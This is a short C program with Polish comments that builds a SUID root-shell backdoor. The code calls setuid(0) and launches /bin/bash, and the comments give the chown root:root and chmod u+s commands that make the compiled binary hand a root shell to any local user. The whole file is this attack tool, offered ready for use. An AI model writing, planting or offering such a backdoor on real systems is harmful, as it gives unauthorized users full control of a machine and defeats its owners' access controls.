#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0); // Nadaje uprawnienia roota
    execl("/bin/bash", "bash", NULL);
    return 0;
}

// ustawienie właściciela pliku jako root
// sudo chown root:root root_shell
// bit SUID
// sudo chmod u+s root_shell